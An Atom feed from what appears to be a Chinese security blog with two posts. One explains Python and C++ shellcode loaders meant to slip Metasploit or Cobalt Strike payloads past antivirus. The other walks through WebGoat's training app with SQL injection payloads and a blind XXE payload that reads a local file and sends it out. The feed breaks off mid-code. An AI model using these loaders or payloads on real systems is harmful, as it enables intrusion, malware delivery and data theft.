<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>不如茶酒伴</title>
  
  <subtitle>大风起兮！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t43wiu6.github.io/"/>
  <updated>2019-12-25T02:24:06.090Z</updated>
  <id>https://t43wiu6.github.io/</id>
  
  <author>
    <name>t43wiu6</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ShellCode加载器的探索与学习</title>
    <link href="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/"/>
    <id>https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/</id>
    <published>2019-12-20T12:39:32.000Z</published>
    <updated>2019-12-25T02:24:06.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ShellCode-Loader"><a href="#ShellCode-Loader" class="headerlink" title="ShellCode Loader"></a>ShellCode Loader</h2><p><img src="/2019/12/20/ShellCode-Loader/3.png" alt=""></p><blockquote><p>当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。<br>这个时候我们就需要一个能免杀加载Payload的程序了，攻防向来都是动态的，只有把握原理自行衍生摸索才是正道。</p></blockquote><a id="more"></a><h2 id="Python？"><a href="#Python？" class="headerlink" title="Python？"></a>Python？</h2><p>一定要用pyhton吗，为啥要用python呢？<br>实际上ctypes函数的原型都是c++函数，之所以使用python来打包，考虑到偏门语言编译自带的一些免杀光环.</p><p>加载器这个东西很多语言都可以实现，比如:</p><ul><li>[go-shellcode] <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a> </li><li>[c#]  <a href="https://github.com/cribdragg3r/Simple-Loader" target="_blank" rel="noopener">https://github.com/cribdragg3r/Simple-Loader</a> </li><li>c++</li></ul><p>以上举例有部分并不完善，但作概念验证足以。<br>再来康康最近网上公开的几个代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅python2</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">shellcode = bytearray(payload)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">""</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line"><span class="comment">#libc = CDLL('libc.so.6')</span></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>原理都是通过ctypes库在内存注入shellcode，只要通过pyinstall打包为exe</p><p>（对py版本有要求，否则报错，如我的3.7.3报错了）</p><h2 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h2><p>[python官方文档]  <a href="https://docs.python.org/3/library/ctypes.html" target="_blank" rel="noopener">https://docs.python.org/3/library/ctypes.html</a> </p><p><img src="1.png" alt="image-20191107102608459"></p><p>在官方文档中我们可以看到，对应的数据类型</p><p>提取一下核心函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><p>引用一下<code>rcoil</code>大佬的原话</p><blockquote><p> <code>Cobalt Strike</code> 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。 </p></blockquote><p>而这里的<strong>VirtualAlloc</strong>也是类似的，不过<strong>VirtualAllocEx</strong> 是在另一个进程分配内存<strong>VirtualAlloc</strong>则在本进程，其函数原型为</p><p><img src="2.png" alt="image-20191107105243022"></p><ul><li><p><code>lpAddress</code>  要分配的区域的起始地址</p></li><li><p><code>dwSize</code> 要分配的大小, 以字节为单位</p></li><li><p><code>flAllocationType</code>  内存分配的类型,具体类型种类可以自行查看</p><p> <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN</a></p></li><li><p><code>flProtect</code> 对要分配的页面区域的内存保护</p></li></ul><h2 id="RtlMoveMemory"><a href="#RtlMoveMemory" class="headerlink" title="RtlMoveMemory"></a>RtlMoveMemory</h2><blockquote><p> 将源内存块的内容复制到目标内存块 </p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">RtlMoveMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_       VOID UNALIGNED *Destination,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">const</span> VOID UNALIGNED *Source,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        SIZE_T         Length</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>Destination</code> 指向要复制字节的目标存储块的指针。 </li><li><code>Source</code> 指向要复制字节的目标存储块的指针。 </li><li><code>Length</code>从源复制到目标的字节数。 </li></ul><h2 id="VirualProtect"><a href="#VirualProtect" class="headerlink" title="VirualProtect"></a>VirualProtect</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">  PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>flNewProtect</code>  内存保护选项 </li><li><code>lpflOldProtect</code>  指向变量的指针，该变量接收页面的指定区域中第一页的先前访问保护值。 </li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例</span></span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br></pre></td></tr></table></figure><h2 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h2><blockquote><p> 创建一个线程以在调用进程的虚拟地址空间内执行</p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>lpThreadAttributes</code> 描述是否可以由子进程继承 </li><li><code>dwStackSize</code> 堆栈的初始大小，以字节为单位 , 参数为0，则使用可执行文件的默认大小 (1MB)</li><li><p><code>lpStartAddress</code>  该指针表示线程的起始地址 </p></li><li><p><code>lpParameter</code> 指向要传递给线程的变量的指针 </p></li><li><code>dwCreationFlags</code>  控制线程创建的标志，0为创建后立即执行</li><li><code>lpThreadId</code> 指向接收线程标识符的变量的指针，为 <strong>NULL</strong>，则不返回线程标识符</li></ul><h2 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>hHandle</code> 对象的句柄 </p></li><li><p><code>dwMilliseconds</code>  超时时间间隔（以毫秒为单位）  </p><p>如果指定了非零值，则函数将等待直到发出信号通知对象或间隔过去 </p></li></ul><h2 id="C-原型"><a href="#C-原型" class="headerlink" title="C++原型"></a>C++原型</h2><p>很显然这些加载器的过程都是大同小异，核心就是以下流程</p><ul><li>通过<strong>VirtualAlloc</strong> \ <strong>VirtualAllocEx</strong>分配内存</li><li>通过<strong>RtlMoveMemory</strong> \ <strong>RtlCopyMemory</strong>将Shellcode复制或移动到已分配内存中<br>（C++中可简写为memcpy\memove）</li><li>使用<strong>CreateThread</strong>在子线程中运行<blockquote><p>当然如果使用<strong>VirtualAllocEx</strong>就不需要使用<strong>CreateThread</strong>了</p></blockquote></li></ul><p>这里贴一下这些变形函数的<code>c++</code>原型</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)<span class="comment">//运行不显示窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里放shellcode</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">void</span>* buffer)</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span>(*function)();</span><br><span class="line">function = (<span class="keyword">void</span> (*)())buffer;</span><br><span class="line">function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID ptr = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">RtlMoveMemory(ptr, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">LPVOID ht = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)&amp;run, ptr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(ht, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>PS:这个原型模板编译出来的exe已经被主流杀软杀掉了，这里鄙视下360。原因你懂的</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>说点题外话，<code>cobaltstrike4.0</code>中，根据其展示的视频，作者将<code>VirtualAlloc</code>替换为了<code>HeadCreate</code> <code>ByPass</code>了Win10的Defender。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ShellCode-Loader&quot;&gt;&lt;a href=&quot;#ShellCode-Loader&quot; class=&quot;headerlink&quot; title=&quot;ShellCode Loader&quot;&gt;&lt;/a&gt;ShellCode Loader&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2019/12/20/ShellCode-Loader/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。&lt;br&gt;这个时候我们就需要一个能免杀加载Payload的程序了，攻防向来都是动态的，只有把握原理自行衍生摸索才是正道。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="杀软对抗" scheme="https://t43wiu6.github.io/tags/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>从WebGoat学习Java代码审计</title>
    <link href="https://t43wiu6.github.io/2019/04/20/CodeAudit-Java-Webgoat/"/>
    <id>https://t43wiu6.github.io/2019/04/20/CodeAudit-Java-Webgoat/</id>
    <published>2019-04-20T12:39:32.000Z</published>
    <updated>2019-12-25T03:10:36.194Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说在前面的话"><a href="#说在前面的话" class="headerlink" title="说在前面的话"></a>说在前面的话</h2><blockquote><p>补一下以前挖的坑，好多忘了上传…</p></blockquote><p>以前硬着头皮啃了本php代码审计的书，感觉还是java好玩，这次来学学Java审计。</p><blockquote><p>ps:目的是熟悉各种漏洞在Java下的表现，所以并没有按着通关要求来做，只是点到为止</p></blockquote><h2 id="WebGoat环境配置"><a href="#WebGoat环境配置" class="headerlink" title="WebGoat环境配置"></a>WebGoat环境配置</h2><a id="more"></a><p>WebGoat是由OWASP维护的基于Java开发的Web应用程序，主要用于安全教学</p><ul><li><a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" target="_blank" rel="noopener">[官方网站]</a></li><li><a href="https://github.com/WebGoat/WebGoat/releases" target="_blank" rel="noopener">[项目github]</a></li></ul><p>既然是奔着代码审计来的，那当然是下载源代码啦。<br><!--more--></p><p>先导入到idea，(关于maven配置等就不赘述了)，导入成功后maven会自动进行配置<br>项目采用了SpringBoot，直接进入Debug模式</p><p><img src="springboot.PNG" alt="springboot"></p><p>访问<code>localhost:8080/WebGoat</code></p><p><img src="Welcome.PNG" alt="Welcome"></p><p>注册个用户就可以登录了<br>配置好后默认是只能从127.0.0.1访问，如果有需要可以打开这个文件，进行修改</p><p><code>webgoat-container/src/main/resources/application.properties</code></p><p><img src="settings.PNG" alt="settings"></p><h2 id="从SQLI开始审计之旅"><a href="#从SQLI开始审计之旅" class="headerlink" title="从SQLI开始审计之旅"></a>从SQLI开始审计之旅</h2><p>注入中第一项是<code>SQL Injection (advanced)</code>,先测试注册功能<br>那么先下个断点跟进到对应业务逻辑类，可以看到这里有一处参数检查</p><p><img src="sqli-advanced.PNG" alt="sqli-advanced"></p><p>继续跟进，发现只检查了是否为空和长度，然后对用户名进行查重时直接带入了参数<br>而查重后的插入数据使用了预编译<br>鉴于返回到前端的参数只有<code>user.created</code>和<code>user.exists</code>两种。基本确认为盲注</p><p>漏洞验证如下，tom用户明明是存在的，但用户依然创建成功证明payload生效，<code>and 1=2</code>导致查询出的用户名不存在从而进入创建流程</p><p><img src="sqli-advanced-verify.PNG" alt="sqli-advanced-verify"></p><p>那么exp应该是</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom<span class="string">'+and+if(ascii(substr(database(),1,1))&gt;100,SLEEP(10),NULL)--+</span></span><br></pre></td></tr></table></figure><p>然而报500错误，sql语法不正确，这是因为采用的是<code>HSQLDB</code>，即java内置的数据库<br><code>IF</code>和<code>SLEEP</code>语句是Mysql的扩展语句，emmm</p><p><code>IF</code>应该可以使用<code>CASE WHEN THEN ELSE END</code>代替，<code>SLEEP</code>没有找到代替的函数<br>这个是SQLmap给出的时间盲注payload，我没看懂…似乎是重复查询多次达到延时的样子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username_reg=tom<span class="string">' AND CHAR(87)||CHAR(90)||CHAR(97)||CHAR(110)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND '</span>zDag<span class="string">'='</span>zDag&amp;email_reg=a@gmail.com&amp;password_reg=123&amp;confirm_password_reg=123</span><br></pre></td></tr></table></figure><p>后来发现可以直接布尔盲注，tom这个用户名是存在的为true，只要后面为false就会返回<code>user created</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom<span class="string">'+and+ascii(substr(database(),1,1))&lt;100--+</span></span><br></pre></td></tr></table></figure><p><img src="sqli-advanced-exp.PNG" alt="sqli-advanced-exp"></p><h2 id="SQLi-5a"><a href="#SQLi-5a" class="headerlink" title="SQLi-5a"></a>SQLi-5a</h2><blockquote><p>别问我为什么叫这个奇怪的名字，这是类名….</p></blockquote><p><img src="sqli-5a-route.PNG" alt="sqli-5a-route"></p><p>根据form中的url搜索到对应类</p><p><img src="sqli-5a.PNG" alt="sqli-5a"></p><p><code>union</code>，<code>堆注入</code>,<code>and/or</code>都可以<br>另一个是数字型注入<code>SQLi-5b</code><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connection connection = DatabaseUtilities.getConnection(getWebSession());</span><br><span class="line">String query = <span class="string">"SELECT * FROM user_data WHERE userid = "</span> + accountName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">ResultSet results = statement.executeQuery(query);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同上的利用方法</p><h2 id="SQLi-6a"><a href="#SQLi-6a" class="headerlink" title="SQLi-6a"></a>SQLi-6a</h2><p>跟5a的利用相同</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String query = <span class="string">"SELECT * FROM user_data WHERE last_name = '"</span> + accountName + <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p><img src="sqli-5a-6a-pay.PNG" alt="sqli-5a-6a-pay"></p><h2 id="XXE-SimpleXXE"><a href="#XXE-SimpleXXE" class="headerlink" title="XXE-SimpleXXE"></a>XXE-SimpleXXE</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Comment comment = comments.parseXml(commentStr);</span><br><span class="line">    comments.addComment(comment, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (checkSolution(comment)) &#123;</span><br><span class="line">        <span class="keyword">return</span> trackProgress(success().build());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    error = ExceptionUtils.getFullStackTrace(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下<code>commnet</code>类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String dateTime;</span><br><span class="line">    <span class="keyword">private</span> String text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>parseXml</code></p><p><img src="xxe-simplexxe-parseXml.PNG" alt="xxe-simplexxe-parseXml"></p><p>可以看到<code>SUPPORT_DTD</code>设为了<code>true</code>,即启用了实体引用</p><p>同时<code>IS_SUPPORTING_EXTERNAL_ENTITIES</code>设为了<code>true</code>，启用了外部实体引用</p><p><img src="xxe-simplexxe-payload.PNG" alt="xxe-simplexxe-payload"></p><p>在d盘根目录下新建一个文件<code>hack.md</code></p><blockquote><p>ps:<code>file:///</code>不加任何文件名可以列目录</p></blockquote><p>抓包将xml做一些修改，通过外部实体读取文件，并替换到输出点text中，刷新页面</p><p><img src="xxe-simplexxe-ssucess.PNG" alt="xxe-simplexxe-ssucess"></p><h2 id="XXE-Json"><a href="#XXE-Json" class="headerlink" title="XXE-Json"></a>XXE-Json</h2><p>可见post的表单同时支持json，xml，且默认使用json传输</p><p><img src="xxe-json-parseXml.PNG" alt="xxe-json-parseXml"><br>尝试对HTTP头中的<code>content-type</code>进行修改，指定为xml</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Content-Type: application/xml</span><br></pre></td></tr></table></figure><p>使之进入parseXml流程，成功触发XXE漏洞</p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind-XXE"></a>Blind-XXE</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String CONTENTS = <span class="string">"WebGoat 8.0 rocks... ("</span> + randomAlphabetic(<span class="number">10</span>) + <span class="string">")"</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="meta">@RequestMapping</span>(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AttackResult <span class="title">addComment</span><span class="params">(@RequestBody String commentStr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//Solution is posted as a separate comment</span></span><br><span class="line">    <span class="keyword">if</span> (commentStr.contains(CONTENTS)) &#123;</span><br><span class="line">        <span class="keyword">return</span> trackProgress(success().build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Comment comment = comments.parseXml(commentStr);</span><br><span class="line">        comments.addComment(comment, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> trackProgress(failed().output(e.toString()).build());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> trackProgress(failed().build());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当获取值包含要读取的字符串时，执行<code>return</code></p><p>预期解法应该是使用带外通道来回显</p><p><img src="Blind-XXE-no.PNG" alt="Blind-XXE-no"></p><p>但我通过原方法进行读取，并没有拦截到</p><p>仔细一想…payload确实不包含<code>WebGoat 8.0 rocks... (...</code>这个字符串啊,而且为啥会包含啊</p><p>陷入沉思…</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows-version.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://localhost:9090/ping?text=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>以上是预期解</p><h2 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a>Authentication Bypasses</h2><p><img src="AF-complete.PNG" alt="AF-complete"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">didUserLikelylCheat</span><span class="params">(HashMap&lt;String,String&gt; submittedAnswers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> likely = <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123;</span><br><span class="line">            likely = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((submittedAnswers.containsKey(<span class="string">"secQuestion0"</span>) &amp;&amp; submittedAnswers.get(<span class="string">"secQuestion0"</span>).equals(secQuestionStore.get(verifyUserId)</span><br><span class="line">     .get(<span class="string">"secQuestion0"</span>))) &amp;&amp;</span><br><span class="line">     (submittedAnswers.containsKey(<span class="string">"secQuestion1"</span>) &amp;&amp; submittedAnswers.get(<span class="string">"secQuestion1"</span>).equals(secQuestionStore.get(verifyUserId)</span><br><span class="line">     .get(<span class="string">"secQuestion1"</span>))) ) &#123;</span><br><span class="line">            likely = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            likely = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> likely;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyAccount</span><span class="params">(Integer userId, HashMap&lt;String,String&gt; submittedQuestions )</span> </span>&#123;</span><br><span class="line">        <span class="comment">//short circuit if no questions are submitted</span></span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">"secQuestion0"</span>) &amp;&amp; !submittedQuestions.get(<span class="string">"secQuestion0"</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">"secQuestion0"</span>))) 